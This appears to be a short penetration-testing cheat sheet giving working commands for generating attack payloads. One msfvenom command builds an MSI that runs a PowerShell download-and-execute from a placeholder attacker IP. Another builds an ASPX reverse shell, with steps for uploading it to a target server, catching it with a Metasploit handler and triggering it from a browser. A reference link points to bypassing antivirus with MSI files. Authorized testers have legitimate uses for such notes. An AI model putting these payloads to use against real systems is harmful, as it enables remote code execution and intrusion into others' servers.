# Generating Attack Payload

## MSI Reverse Shell for [Covenant](https://github.com/cobbr/Covenant)

    msfvenom -p windows/x64/exec CMD="cmd /c powershell iex(new-object net.webclient).downloadstring('http://<Attacker_IP>/shell.ps1')" -f msi > pwn.msi

## ASPX Reverse Shell

1. Generate payload

        msfvenom -p windows/shell/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx -o pwn.aspx    

2. Upload the payload to the target server
3. Start a listener. Use Metasploit `exploit/multi/handler/` module with payload set to `windows/shell/reverse_tcp`
4. Naviagate to malicious ASPX page in the browser window to trigger the payload and to receive the reverse shell

## References

**Listener:**

* https://pentestlab.blog/tag/msi/
* https://blog.netspi.com/bypassing-anti-virus-with-metasploit-msi-files/